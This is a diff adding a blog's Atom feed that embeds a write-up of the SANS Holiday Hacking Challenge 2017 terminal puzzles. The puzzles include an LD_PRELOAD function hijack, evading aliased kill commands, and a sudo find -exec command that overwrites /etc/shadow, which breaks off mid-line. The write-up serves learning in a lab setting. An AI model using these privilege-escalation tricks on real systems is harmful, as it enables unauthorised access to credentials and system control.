@@ -1,0 +1,606 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-01-12T22:15:24+01:00</updated><id>http://localhost:4000/</id><title type="html">H4ck and that</title><subtitle>Blog for herrfeder</subtitle><author><name>herrfeder</name></author><entry><title type="html">SANS Holiday Hacking Challenge</title><link href="http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017.html" rel="alternate" type="text/html" title="SANS Holiday Hacking Challenge" /><published>2018-01-04T17:00:00+01:00</published><updated>2018-01-04T17:00:00+01:00</updated><id>http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017</id><content type="html" xml:base="http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017.html">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#overview&quot; id=&quot;markdown-toc-overview&quot;&gt;Overview&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#terminal-challenges&quot; id=&quot;markdown-toc-terminal-challenges&quot;&gt;Terminal Challenges&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot; id=&quot;markdown-toc-isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot;&gt;Isit42 (Overwrite C-Functions with Preload)  Wunorse Openslae&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#kill-santaslittlehelperd-sparkle-redberry&quot; id=&quot;markdown-toc-kill-santaslittlehelperd-sparkle-redberry&quot;&gt;Kill santaslittlehelperd Sparkle Redberry&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#execute-elftalkd-bushy-evergreen&quot; id=&quot;markdown-toc-execute-elftalkd-bushy-evergreen&quot;&gt;Execute elftalkd Bushy Evergreen&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#starting-arm-train-binary-pepper-minstix&quot; id=&quot;markdown-toc-starting-arm-train-binary-pepper-minstix&quot;&gt;Starting ARM Train binary Pepper Minstix&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#execute-file-without-permissions-holly-evergreen&quot; id=&quot;markdown-toc-execute-file-without-permissions-holly-evergreen&quot;&gt;Execute File without Permissions Holly Evergreen&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#extract-information-minty-candycane&quot; id=&quot;markdown-toc-extract-information-minty-candycane&quot;&gt;Extract Information Minty Candycane&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#edit-shadow-without-rights-shinny-upatree&quot; id=&quot;markdown-toc-edit-shadow-without-rights-shinny-upatree&quot;&gt;Edit Shadow without Rights Shinny Upatree&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#inspecting-christmassongsdb-sugarplum-mary&quot; id=&quot;markdown-toc-inspecting-christmassongsdb-sugarplum-mary&quot;&gt;Inspecting christmassongs.db Sugarplum Mary&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#apache-struts-server&quot; id=&quot;markdown-toc-apache-struts-server&quot;&gt;Apache Struts Server&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#network-reconnaisance&quot; id=&quot;markdown-toc-network-reconnaisance&quot;&gt;Network Reconnaisance&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#windows-smb-server&quot; id=&quot;markdown-toc-windows-smb-server&quot;&gt;Windows SMB Server&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#mail-server-with-custom-cookie-based-encryption&quot; id=&quot;markdown-toc-mail-server-with-custom-cookie-based-encryption&quot;&gt;Mail Server with custom Cookie based encryption&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#online-resource-management-with-xml-external-entity-xxe-vulnerability&quot; id=&quot;markdown-toc-online-resource-management-with-xml-external-entity-xxe-vulnerability&quot;&gt;Online Resource Management with XML External Entity (XXE) Vulnerability&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot; id=&quot;markdown-toc-database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot;&gt;Database with XSS Vulnerability, JavaScript Web Token (JWT) Vulnerability and LDAP Injection Vulnerability&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#xss&quot; id=&quot;markdown-toc-xss&quot;&gt;XSS&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#jwt&quot; id=&quot;markdown-toc-jwt&quot;&gt;JWT&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;I will cut the lovely story behind the hacking tasks short. The homebase of Santa Clause is threatened by Giant Snowballs. Someone or something is throwing these snowballs onto the peaceful christmastown and you have to find out what’s going on. To get some hints you have to solve some terminal challenges. That are web emulated shells with a given task. For solving these tasks one of the busy christmals elves will give you hints for the main tasks.&lt;/p&gt;
+
+&lt;h2 id=&quot;terminal-challenges&quot;&gt;Terminal Challenges&lt;/h2&gt;
+
+&lt;h3 id=&quot;isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot;&gt;Isit42 (Overwrite C-Functions with Preload)  Wunorse Openslae&lt;/h3&gt;
+
+&lt;p&gt;Opening the Terminal will welcome you with the description for the challenge:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Wunorse Openslae has a special challenge &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you.
+Run the given binary, make it &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;42.
+Use the partial &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hints, it is just a clue.
+You will need to write your own code, but only a line or two.
+total 88
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 84824 Dec 16 16:56 isit42
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root   654 Dec 16 16:56 isit42.c.un
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There is a file given that includes the important parts of the binary:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+// DATA CORRUPTION ERROR
+// MUCH OF THIS CODE HAS BEEN LOST
+// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
+// MAKE THE isit42 BINARY RETURN 42
+// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
+int getrand() {
+    srand((unsigned int)time(NULL)); 
+    printf(&quot;Calling rand() to select a random number.\n&quot;);
+    // The prototype for rand is: int rand(void);
+    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
+}
+int main() {
+    sleep(3);
+    int randnum = getrand();
+    if (randnum == 42) {
+        printf(&quot;Yay!\n&quot;);
+    } else {
+        printf(&quot;Boo!\n&quot;);
+    }
+    return randnum;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the hint from &lt;a href=&quot;https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win&quot;&gt;SANS Blog&lt;/a&gt; it was obvious that I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; to overwrite standard libc functions. overwrite_getrand.c :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+int rand() {
+return 4138;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When compiling you have to use specific flags:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc overwrite_getrand.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; overwrite_getrand &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;shared will create a shared library&lt;/li&gt;
+  &lt;li&gt;fPIC is used to create position independent code
+This will make sure it overwrites functions from other shared libraries.
+When executing it will now output the right value.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/overwrite_getrand&quot;&lt;/span&gt; ./isit42
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;kill-santaslittlehelperd-sparkle-redberry&quot;&gt;Kill santaslittlehelperd Sparkle Redberry&lt;/h3&gt;
+
+&lt;p&gt;Sparkle will give you a very easy and hard task, too, when you are not looking into the right files.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Sparkle Redberry, and I need your help.
+My server is atwist, and I fear I may yelp.
+Help me &lt;span class=&quot;nb&quot;&gt;kill &lt;/span&gt;the troublesome process gone awry.
+I will &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;the favor with a gift before nigh.
+Kill the &lt;span class=&quot;s2&quot;&gt;&quot;santaslittlehelperd&quot;&lt;/span&gt; process to &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;this challenge.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@efae06a0bf5f:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-fax&lt;/span&gt;
+  PID TTY      STAT   TIME COMMAND
+    1 pts/0    Ss     0:00 /bin/bash /sbin/init
+    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
+   11 pts/0    S      0:00 /sbin/kworker
+   18 pts/0    S      0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; /sbin/kworker
+   12 pts/0    S      0:00 /bin/bash
+  107 pts/0    R+     0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; ps &lt;span class=&quot;nt&quot;&gt;-fax&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After some damning about this task because of it simplicity I got the problem.
+All popular commands to kill processes have aliases to prevent actually killing anything. That feels like monkeyshines for admins.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@efae06a0bf5f:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;alias
+alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;')&quot;'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;egrep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'egrep --color=auto'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fgrep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fgrep --color=auto'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias grep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'grep --color=auto'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias kill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;killall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -CF'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;la&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -A'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -alF'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls --color=auto'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pkill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;skill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this knowledge I used “top” and pressed k to kill the process. Afterwards you have to refresh the page to solve it silently.&lt;/p&gt;
+
+&lt;h3 id=&quot;execute-elftalkd-bushy-evergreen&quot;&gt;Execute elftalkd Bushy Evergreen&lt;/h3&gt;
+
+&lt;p&gt;Bushy wants you to find a executable. When you are familiar with grep this is very easy.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Bushy Evergreen, and I have a problem &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you.
+I think a server got owned, and I can only offer a clue.
+We use the system &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;chat, to keep toy production running.
+Can you &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;us recover from the server connection shunning?
+Find and run the elftalkd binary to &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;this challenge.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;When using grep with recursive option on the system root you can find it easily.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@11cb77f0b8ea:~$ grep -rli elftalkd / 2&amp;gt;/dev/null | grep elftalk
+/run/elftalk/bin/elftalkd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;starting-arm-train-binary-pepper-minstix&quot;&gt;Starting ARM Train binary Pepper Minstix&lt;/h3&gt;
+
+&lt;p&gt;Seeing a nice ASCII train Pepper would like you to execute a given binary.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Pepper Minstix, and I need your &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;with my plight.
+I&lt;span class=&quot;s1&quot;&gt;'ve crashed the Christmas toy train, for which I am quite contrite.
+I should not have interfered, hacking it was foolish in hindsight.
+If you can get it running again, I will reward you with a gift of delight.
+
+
+total 444
+-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It’s executable by anyone but it’s the architecture that matters:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@bdaf2542fc01:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file trainstartup 
+trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;My first thought is emulation and I guess thats the intended solution:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@bdaf2542fc01:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/qemu-arm trainstartup 
+Starting up ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;execute-file-without-permissions-holly-evergreen&quot;&gt;Execute File without Permissions Holly Evergreen&lt;/h3&gt;
+
+&lt;p&gt;Hollys challenge will ask you to execute a file.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Holly Evergreen, and I have a conundrum.
+I broke the candy cane striper, and I'm near throwing a tantrum.
+Assembly lines have stopped since the elves can't get their candy cane fix.
+We hope you can start the striper once again, with your vast bag of tricks.
+Run the CandyCaneStriper executable to complete this challenge.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The desired file isn’t owned by your user:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 68
+drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 elf  elf    220 Aug 31  2015 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  3143 Dec 15 19:59 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 elf  elf    655 May 16  2017 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 45224 Dec 15 19:59 CandyCaneStriper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As it is allowed to read the file and we can use encoding utilities like base64 we can simply copy the content into a new file and execute it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CandyCaneStriper | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; CandyCaneStriper_base64
+elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CandyCaneStriper_base64 | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; CandyCaneStriper_elf
+elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/touch test_file
+elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;CandyCaneStriper_elf test_file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;extract-information-minty-candycane&quot;&gt;Extract Information Minty Candycane&lt;/h3&gt;
+
+&lt;p&gt;Minty gives us a http server log and wants us to find the least popular one:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Minty Candycane here, I need your &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;straight away.
+We&lt;span class=&quot;s1&quot;&gt;'re having an argument about browser popularity stray.
+Use the supplied log file from our server in the North Pole.
+Identifying the least-popular browser is your noteworthy goal.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Maybe there are more elegant ways to exclude information progressively but it was the easiest way at first glance:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;access.log | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; facebook | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; mozilla | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; safari | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; zmeu | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; slack | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; sysscan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; googlebot | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; twitter | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wget | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; masscan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; python 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After excluding a lot of browser entries I found the one, that occurs only a single time. I never heard of it:
+Dillo&lt;/p&gt;
+
+&lt;h3 id=&quot;edit-shadow-without-rights-shinny-upatree&quot;&gt;Edit Shadow without Rights Shinny Upatree&lt;/h3&gt;
+
+&lt;p&gt;Shinny wants you to edit the shadow file without the needed permissions:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Shinny Upatree, and I've made a big mistake.
+I fear it's worse than the time I served everyone bad hake.
+I've deleted an important file, which suppressed my server access.
+I can offer you a gift, if you can fix my ill-fated redress.
+Restore /etc/shadow with the contents of /etc/shadow.bak, then run &quot;inspect_da_box&quot; to complete this challenge.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;When inspecting the sudoers file it occurs that my user is allowed to run &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; with shadow group rights. As find allows many exec operations on top it’s easy to cook a bash command:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span 